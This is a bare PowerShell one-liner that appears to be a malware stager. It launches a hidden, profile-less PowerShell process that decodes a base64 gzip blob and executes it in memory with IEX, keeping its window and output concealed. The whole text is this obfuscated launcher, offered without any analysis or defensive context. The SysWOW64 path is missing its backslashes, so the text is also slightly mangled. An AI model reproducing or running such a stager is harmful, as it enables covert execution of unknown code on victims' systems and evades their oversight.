if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'syswow64WindowsPowerShellv1.0powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIALUMS1gCA7VWa2/aSBT9nEr9D1aFhK0SDAlJmkiVdox5BhPAYAIUVRN7bAbGHmKPw6Pb/77XgBuybapUq7VAnse9M2fOPXeu3TiwBeWB5Fvl7oX07f27kw4OsS/JGfbousXtpmZ85c2clPH1/oPhCOXkBGwy27sBXm5I/9p8kj5L8gQtlzr3MQ2mNzflOAxJIPb9fI0IFEXEf2CURLIi/S0NZyQkp3cPc2IL6ZuU+ZqvMf6A2cFsU8b2jEinKHCSuRa3cYIwby4ZFXL2y5esMjktTvOVxxizSM6am0gQP+8wllWk70qyYX+zJHLWoHbII+6K/JAG52f5QRBhl7RhtSdiEDHjTpRV4DDwC4mIw0A6Playzt5KzkKzE3IbOU5IInDKN4InviByJogZy0l/yZMDiF4cCOoTmBck5EuThE/UJlG+jgOHkR5xp3KbrNKzv9VJPnYCq44IlRxE6HW0BndiRvYLZJWf8b4IrgLPUYCBku/v371/56bSWLHLOyRafTc+1ge0Tia7NgHYcodHdGf9WSrkJAN2xoKHG+hm+mFMlKk0SaIymU6ljGhfEBSfW/Pc64sUUw+wXzvLZGhicepMweUQtMxq9pAMv649nbg0IPomwD61U3nJvwoBcRnZnTafmrUBk5w9TBBHJ4x4WCRs5qTJz24Vn4ofvlpMmUNCZEMYI0AFEVZegtkHSM42AoP4wNO+n4UwuCBqklofhLxJd0/6YJQtMxxFOakTQ1bZOckkmBEnJ6EgoocpFAu+a2af4RoxE9TGkUiXmyoHGg/blXkQiTC2IXJw9L65JDbFLGEiJ9WpQ7SNSb102+wveShjxmjgwUpPEAcYSc5vikQPISB8jr2SN4lo+EtGfDDcpXiVYQ8S+pAPOxVhjzjZf6FMdb4XdUJHysMRRoixybjISRYNBVwUCbWJjv4DhKN7IgFTDskhInKaMhNtIxKJZ8Ihv3go1WduIRHogaUdJ6EAPqoh9zUckcuSKUJgS/6g3tEygmfUCJhhawtaRCtabBjwH9DzBtevnNvmvK6G+nrmokbUMOodvVuvl56aplUSZqUhbjsNYVTu53MT1XuDkRg3UL1PC4tRabts0q3ZQs5orV5ute2qoK23c89xR7rreleu2SteVGlrWO5qhTPc0itxa6ittEIpqtBVvUsH3UWzKh5GFsMDV/Xui9eYrlvh3CpyY9tAqDY7t7dN16rNDGczqqvXw9ICVRAqBxWrqvHbkRaijmphz+KrWw+Nfa+MtKpLybg7qGrdblVDg9r8Ub9WPfC9xzNtaJ3R8fK+N4N+FSDcqoVSwyFbPuoCSTWOsNcDG698Zs9csNE/Iu1jm0dneKFxpIFNdfwIuEbLaofBfH9wxpHF2vcYtcabqqoWR50SqhfosOahZEnsaV2Moid9q6tFy+HO8KI9clXrnl2perm/tF1VVVd1/dYeF9ef7q4+tYbU8jkaqKr1IREHqCNDP8W9Oes3LwbLo7C/dr0bOIxmmIEc4MJOM7LKw+rh3u1wmnjI8r40L0gYEAZlDApdKmrEGLeTUnB0RUMx2peIKeTnAJrnZ79sKdIPQ+W5QqRDNzdjAAvJ8qzkfIsEnpjlCuvzQgHu+MK6VICTv/2YZb7cyEcL5pJKcUzay+3YbjslyauM17tanDc32/r/zOshp2fwct7G6/PYb2bfxHUh94KLn2ZfDvwR839OxBBTAaYmXE6M7Gvl7/g4SOroS+NHxEAv7uFJPv7uYnHahq+QfwAa1LzOeQoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);